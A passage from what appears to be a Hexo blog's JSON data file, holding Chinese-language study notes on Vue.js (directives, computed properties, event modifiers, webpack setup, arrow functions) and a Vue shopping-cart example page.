class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">     <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">         <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">         <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">             <span class=\"hljs-attr\">type</span>:<span class=\"hljs-string\">&#x27;name&#x27;</span>,</span><br><span class=\"language-javascript\">         &#125;,</span><br><span class=\"language-javascript\">         <span class=\"hljs-attr\">methods</span>:&#123;</span><br><span class=\"language-javascript\">             <span class=\"hljs-attr\">changeMode</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                 <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">type</span>=<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">type</span>===<span class=\"hljs-string\">&#x27;name&#x27;</span>?<span class=\"hljs-string\">&#x27;mail&#x27;</span>:<span class=\"hljs-string\">&#x27;name&#x27;</span>;</span><br><span class=\"language-javascript\">             &#125;</span><br><span class=\"language-javascript\">         &#125;</span><br><span class=\"language-javascript\">     &#125;)</span><br><span class=\"language-javascript\"> </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>4.v-show:与if基本一致，但是不可以用在’’’&lt;template&gt;&lt;/template&gt;’’’</p>\n<p>区别：v-if只有为true的时候才会编译渲染，而v-show只是css属性切换，一定会编译，适用于经常切换的场合；</p>\n<p>5.v-for：数组遍历及枚举</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>           <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">li</span> <span class=\"hljs-attr\">v-for</span>=<span class=\"hljs-string\">&quot;book in books&quot;</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">li</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>data:&#123;<br>\tbooks:[<br>&#123; name: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Book1</span>&gt;</span>&#x27; &#125;,<br>   &#123; name: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Book1</span>&gt;</span>&#x27; &#125;,<br>   &#123; name: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Book1</span>&gt;</span>&#x27; &#125;, <br>   ]<br>   &#125;,<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-3过滤与排序：使用计算属性返回处理后的数组\"><a href=\"#5-3过滤与排序：使用计算属性返回处理后的数组\" class=\"headerlink\" title=\"5.3过滤与排序：使用计算属性返回处理后的数组\"></a>5.3过滤与排序：使用计算属性返回处理后的数组</h3><p>筛选数据：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">computed:&#123;<br>       filterBooks:function()&#123;<br>           return this.books.filter(function(book)&#123;<br>               return book.name.match(/Book2/);<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-4-方法与事件\"><a href=\"#5-4-方法与事件\" class=\"headerlink\" title=\"5.4 方法与事件\"></a>5.4 方法与事件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">//一个小的计数器<br> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>            点击次数：&#123;&#123; counter &#125;&#125;<br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;counter++&quot;</span>&gt;</span>Click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;add10&quot;</span>&gt;</span>Click +10<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;reset_counter&quot;</span>&gt;</span>Reset<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">     <span class=\"hljs-attr\">add10</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">counter</span>+=<span class=\"hljs-number\">10</span>;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">     <span class=\"hljs-attr\">reset_counter</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span><br><span class=\"language-javascript\">                     <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">counter</span>=<span class=\"hljs-number\">0</span>;</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>5.4.2 修饰符</p>\n<p>修饰符</p>\n<table>\n<thead>\n<tr>\n<th>.stop</th>\n<th>.prevent</th>\n<th align=\"left\">.capture</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>.self</td>\n<td>.once</td>\n<td align=\"left\">.enter</td>\n</tr>\n<tr>\n<td>.tab</td>\n<td>.delete</td>\n<td align=\"left\">.esc</td>\n</tr>\n<tr>\n<td>.space</td>\n<td>.up</td>\n<td align=\"left\">.down</td>\n</tr>\n</tbody></table>\n"},{"title":"Vue.js实战（7）","date":"2020-12-03T13:18:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n\n# Ch10 使用webpack\n\n### 一、webpack基础\n\n​\t1.import和export\n\n```javascript\nvar config={\n    version:'1.1.0'\n};\nexport { Config };\n\nexport var config={\n    versiom:'1.1.0'\n};\n\nexport function add(a,b){\n    return a+b;\n};\n\n\nimport { Config } from './config/js'\nimport { add } from './add.js'\n\n//默认输出\nexport default{\n    \n};\n```\n\n​\t2.npm导入库\n\n​\timport Vue from 'vue';\n\n​\timport $ from 'jquery';\n\n​\t3.webpack基本配置\n\n​\t\tnpm init  //初始化\n\n​\t\tnpm install webpack --sav-dev //作为开发依赖来安装webpack\n\n​\t\tnpm install webpack-dev-server --save-dev //安装开发环境服务器\n\n​\t\tnpm dev //启动本服务器\n\n​\t\twebpack --progress --hide-modules //修建模组？\n\n​\t\tnpm install css-loader --save-dev\n\n​\t\tnpm install style-loader --save-dev\n\n​\t\tnpm install extract-text-webpack-plugin --save-dev\n\n​\t\tnpm run build //打包\n\n4.箭头函数\n\nrender：h=>h(App)等同于：\n\nrender:function(h){\n\nreturn h(App)\n\n}也等同于：\n\nrender:h=>{\n\nreturn h(App);\n\n****}\n\n注：箭头函数里得this指向与普通函数不同，箭头函数得this是定义时得对象，而不是使用时得对象；\n\n5.ES 6语法\n\n```javascript\n components: {\n    Title,\n    Button,\n  },\n  \n  components:{\n      vTitle:Title,\n      vButton:Button\n  }\n```\n\n","source":"_posts/Vue.js实战（7）.md","raw":"---\ntitle: Vue.js实战（7）\ndate: 2020-12-3 21:18:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n\n# Ch10 使用webpack\n\n### 一、webpack基础\n\n​\t1.import和export\n\n```javascript\nvar config={\n    version:'1.1.0'\n};\nexport { Config };\n\nexport var config={\n    versiom:'1.1.0'\n};\n\nexport function add(a,b){\n    return a+b;\n};\n\n\nimport { Config } from './config/js'\nimport { add } from './add.js'\n\n//默认输出\nexport default{\n    \n};\n```\n\n​\t2.npm导入库\n\n​\timport Vue from 'vue';\n\n​\timport $ from 'jquery';\n\n​\t3.webpack基本配置\n\n​\t\tnpm init  //初始化\n\n​\t\tnpm install webpack --sav-dev //作为开发依赖来安装webpack\n\n​\t\tnpm install webpack-dev-server --save-dev //安装开发环境服务器\n\n​\t\tnpm dev //启动本服务器\n\n​\t\twebpack --progress --hide-modules //修建模组？\n\n​\t\tnpm install css-loader --save-dev\n\n​\t\tnpm install style-loader --save-dev\n\n​\t\tnpm install extract-text-webpack-plugin --save-dev\n\n​\t\tnpm run build //打包\n\n4.箭头函数\n\nrender：h=>h(App)等同于：\n\nrender:function(h){\n\nreturn h(App)\n\n}也等同于：\n\nrender:h=>{\n\nreturn h(App);\n\n****}\n\n注：箭头函数里得this指向与普通函数不同，箭头函数得this是定义时得对象，而不是使用时得对象；\n\n5.ES 6语法\n\n```javascript\n components: {\n    Title,\n    Button,\n  },\n  \n  components:{\n      vTitle:Title,\n      vButton:Button\n  }\n```\n\n","slug":"Vue.js实战（7）","published":1,"updated":"2020-12-07T10:01:04.000Z","_id":"clg29vyhj0040ao9c5but853s","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch10-使用webpack\"><a href=\"#Ch10-使用webpack\" class=\"headerlink\" title=\"Ch10 使用webpack\"></a>Ch10 使用webpack</h1><h3 id=\"一、webpack基础\"><a href=\"#一、webpack基础\" class=\"headerlink\" title=\"一、webpack基础\"></a>一、webpack基础</h3><p>​    1.import和export</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> config=&#123;<br>    <span class=\"hljs-attr\">version</span>:<span class=\"hljs-string\">&#x27;1.1.0&#x27;</span><br>&#125;;<br><span class=\"hljs-keyword\">export</span> &#123; <span class=\"hljs-title class_\">Config</span> &#125;;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">var</span> config=&#123;<br>    <span class=\"hljs-attr\">versiom</span>:<span class=\"hljs-string\">&#x27;1.1.0&#x27;</span><br>&#125;;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">a,b</span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> a+b;<br>&#125;;<br><br><br><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Config</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./config/js&#x27;</span><br><span class=\"hljs-keyword\">import</span> &#123; add &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./add.js&#x27;</span><br><br><span class=\"hljs-comment\">//默认输出</span><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span>&#123;<br>    <br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<p>​    2.npm导入库</p>\n<p>​    import Vue from ‘vue’;</p>\n<p>​    import $ from ‘jquery’;</p>\n<p>​    3.webpack基本配置</p>\n<p>​        npm init  //初始化</p>\n<p>​        npm install webpack –sav-dev //作为开发依赖来安装webpack</p>\n<p>​        npm install webpack-dev-server –save-dev //安装开发环境服务器</p>\n<p>​        npm dev //启动本服务器</p>\n<p>​        webpack –progress –hide-modules //修建模组？</p>\n<p>​        npm install css-loader –save-dev</p>\n<p>​        npm install style-loader –save-dev</p>\n<p>​        npm install extract-text-webpack-plugin –save-dev</p>\n<p>​        npm run build //打包</p>\n<p>4.箭头函数</p>\n<p>render：h=&gt;h(App)等同于：</p>\n<p>render:function(h){</p>\n<p>return h(App)</p>\n<p>}也等同于：</p>\n<p>render:h=&gt;{</p>\n<p>return h(App);</p>\n<p>****}</p>\n<p>注：箭头函数里得this指向与普通函数不同，箭头函数得this是定义时得对象，而不是使用时得对象；</p>\n<p>5.ES 6语法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-attr\">components</span>: &#123;<br>   <span class=\"hljs-title class_\">Title</span>,<br>   <span class=\"hljs-title class_\">Button</span>,<br> &#125;,<br> <br> <span class=\"hljs-attr\">components</span>:&#123;<br>     <span class=\"hljs-attr\">vTitle</span>:<span class=\"hljs-title class_\">Title</span>,<br>     <span class=\"hljs-attr\">vButton</span>:<span class=\"hljs-title class_\">Button</span><br> &#125;<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch10-使用webpack\"><a href=\"#Ch10-使用webpack\" class=\"headerlink\" title=\"Ch10 使用webpack\"></a>Ch10 使用webpack</h1><h3 id=\"一、webpack基础\"><a href=\"#一、webpack基础\" class=\"headerlink\" title=\"一、webpack基础\"></a>一、webpack基础</h3><p>​    1.import和export</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> config=&#123;<br>    <span class=\"hljs-attr\">version</span>:<span class=\"hljs-string\">&#x27;1.1.0&#x27;</span><br>&#125;;<br><span class=\"hljs-keyword\">export</span> &#123; <span class=\"hljs-title class_\">Config</span> &#125;;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">var</span> config=&#123;<br>    <span class=\"hljs-attr\">versiom</span>:<span class=\"hljs-string\">&#x27;1.1.0&#x27;</span><br>&#125;;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">a,b</span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> a+b;<br>&#125;;<br><br><br><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Config</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./config/js&#x27;</span><br><span class=\"hljs-keyword\">import</span> &#123; add &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./add.js&#x27;</span><br><br><span class=\"hljs-comment\">//默认输出</span><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span>&#123;<br>    <br>&#125;;<br></code></pre></td></tr></table></figure>\n\n<p>​    2.npm导入库</p>\n<p>​    import Vue from ‘vue’;</p>\n<p>​    import $ from ‘jquery’;</p>\n<p>​    3.webpack基本配置</p>\n<p>​        npm init  //初始化</p>\n<p>​        npm install webpack –sav-dev //作为开发依赖来安装webpack</p>\n<p>​        npm install webpack-dev-server –save-dev //安装开发环境服务器</p>\n<p>​        npm dev //启动本服务器</p>\n<p>​        webpack –progress –hide-modules //修建模组？</p>\n<p>​        npm install css-loader –save-dev</p>\n<p>​        npm install style-loader –save-dev</p>\n<p>​        npm install extract-text-webpack-plugin –save-dev</p>\n<p>​        npm run build //打包</p>\n<p>4.箭头函数</p>\n<p>render：h=&gt;h(App)等同于：</p>\n<p>render:function(h){</p>\n<p>return h(App)</p>\n<p>}也等同于：</p>\n<p>render:h=&gt;{</p>\n<p>return h(App);</p>\n<p>****}</p>\n<p>注：箭头函数里得this指向与普通函数不同，箭头函数得this是定义时得对象，而不是使用时得对象；</p>\n<p>5.ES 6语法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-attr\">components</span>: &#123;<br>   <span class=\"hljs-title class_\">Title</span>,<br>   <span class=\"hljs-title class_\">Button</span>,<br> &#125;,<br> <br> <span class=\"hljs-attr\">components</span>:&#123;<br>     <span class=\"hljs-attr\">vTitle</span>:<span class=\"hljs-title class_\">Title</span>,<br>     <span class=\"hljs-attr\">vButton</span>:<span class=\"hljs-title class_\">Button</span><br> &#125;<br></code></pre></td></tr></table></figure>\n\n"},{"title":"Vue购物车","date":"2020-11-20T09:41:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n\n```html\n//一个购物车实例\n//重点在数据的绑定和computed属性，methods方法在后面的章节\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n    <style type=\"text/css\">\n        table {\n            border: 1px solid black;\n        }\n        th{\n            border: 1px solid black;\n        }\n        td{\n            border: 1px solid black;\n        }\n\n    </style>\n</head>\n\n<body>\n    <div id=\"app\" v-cloak>\n        <template v-if=\"list.length\">\n            <table>\n                <thead>\n                    <tr>\n                        <th></th>\n                        <th>Name</th>\n                        <th>Price</th>\n                        <th>Count</th>\n                        <th>Option</th>\n                    </tr>\n                </thead>\n                <tbody>\n                    <tr v-for=\"(item,index) in list\">\n                        <td>{{ index+1 }}</td>\n                        <td>{{ item.name }}</td>\n                        <td>{{ item.price }}</td>\n                        <td>\n                            <button @click=\"handleReduce(index)\" :disabled=\"item.count === 1\">-</button>\n                            {{ item.count }}\n                            <button @click=\"handleAdd(index)\">+</button>\n                        </td>\n                        <td>\n                            <button @click=\"handleRemove(index)\">移除</button>\n                        </td>\n                    </tr>\n                </tbody>\n            </table>\n            <div>总价：¥ {{ total }}</div>\n        </template>\n\n        <div v-else>购物车竟然是空的，快来添加心仪的商品！</div>\n    </div>\n\n    <script>\n        var app = new Vue({\n            el: '#app',\n            data: {\n                list: [\n                    {\n                        id: 1,\n                        name: 'iPhone',\n                        price: 9998,\n                        count: 1,\n                    },\n                    {\n                        id: 2,\n                        name: 'iPad',\n                        price: 3988,\n                        count: 1,\n                    },\n                    {\n                        id: 3,\n                        name: 'iWatch',\n                        price: 2599,\n                        count: 1,\n                    }\n                ]\n            },\n            methods: {\n                handleAdd: function (index) {\n                    this.list[index].count++;\n                },\n                handleReduce: function (index) {\n                    if (this.list[index].count === 1) {\n                        return;\n                    }\n                    else {\n                        this.list[index].count--;\n                    }\n                },\n                handleRemove: function (index) {\n                    this.list.splice(index, 1);\n                }\n            },\n            computed: {\n                total: function () {\n                    var total = 0;\n                    for (var i = 0; i < this.list.length; i++) {\n                        var item = this.list[i];\n                        total += item.price * item.count;\n                    }\n                    return total.toString().replace(/\\B(?=(\\d{3})+$)/g, ',');\n                }\n            },\n        })\n    </script>\n    <script src=\"../Nowebpack/js/shopping_car.js\"></script>\n</body>\n\n</html>\n```\n\n","source":"_posts/Vue_Shopping_Car.md","raw":"---\ntitle: Vue购物车\ndate: 2020-11-20 17:41:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n\n```html\n//一个购物车实例\n//重点在数据的绑定和computed属性，methods方法在后面的章节\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n    <style type=\"text/css\">\n        table {\n            border: 1px solid black;\n        }\n        th{\n            border: 1px solid black;\n        }\n        td{\n            border: 1px solid black;\n        }\n\n    </style>\n</head>\n\n<body>\n    <div id=\"app\" v-cloak>\n        <template v-if=\"list.length\">\n            <table>\n                <thead>\n                    <tr>\n                        <th></th>\n                        <th>Name</th>\n                        <th>Price</th>\n                        <th>Count</th>\n                        <th>Option</th>\n                    </tr>\n                </thead>\n                <tbody>\n                    <tr v-for=\"(item,index) in list\">\n                        <td>{{ index+1 }}</td>\n                        <td>{{ item.name }}</td>\n                        <td>{{ item.price }}</td>\n                        <td>\n                            <button @click=\"handleReduce(index)\" :disabled=\"item.count === 1\">-</button>\n                            {{ item.count }}\n                            <button @click=\"handleAdd(index)\">+</button>\n                        </td>\n                        <td>\n                            <button @click=\"handleRemove(index)\">移除</button>\n                        </td>\n                    </tr>\n                </tbody>\n            </table>\n            <div>总价：¥ {{ total }}</div>\n        </template>\n\n        <div v-else>购物车竟然是空的，快来添加心仪的商品！</div>\n    </div>\n\n    <script>\n        var app = new Vue({\n            el: '#app',\n            data: {\n                list: [\n                    {\n                        id: 1,\n                        name: 'iPhone',\n                        price: 9998,\n                        count: 1,\n                    },\n                    {\n                        id: 2,\n                        name: 'iPad',\n                        price: 3988,\n                        count: 1,\n                    },\n                    {\n                        id: 3,\n                        name: 'iWatch',\n                        price: 2599,\n                        count: 1,\n                    }\n                ]\n            },\n            methods: {\n                handleAdd: function (index) {\n                    this.list[index].count++;\n                },\n                handleReduce: function (index) {\n                    if (this.list[index].count === 1) {\n                        return;\n                    }\n                    else {\n                        this.list[index].count--;\n                    }\n                },\n                handleRemove: function (index) {\n                    this.list.splice(index, 1);\n                }\n            },\n            computed: {\n                total: function () {\n                    var total = 0;\n                    for (var i = 0; i < this.list.length; i++) {\n                        var item = this.list[i];\n                        total += item.price * item.count;\n                    }\n                    return total.toString().replace(/\\B(?=(\\d{3})+$)/g, ',');\n                }\n            },\n        })\n    </script>\n    <script src=\"../Nowebpack/js/shopping_car.js\"></script>\n</body>\n\n</html>\n```\n\n","slug":"Vue_Shopping_Car","published":1,"updated":"2020-11-20T09:46:02.000Z","_id":"clg29vyhk0043ao9cbc6u1hn1","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">//一个购物车实例<br>//重点在数据的绑定和computed属性，methods方法在后面的章节<br><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text/css&quot;</span>&gt;</span><span class=\"language-css\"></span><br><span class=\"language-css\">        <span class=\"hljs-selector-tag\">table</span> &#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid black;</span><br><span class=\"language-css\">        &#125;</span><br><span class=\"language-css\">        <span class=\"hljs-selector-tag\">th</span>&#123;</span><br><span class=\"language-css\">            <span class=\"hljs-attribute\">border</span>: <span 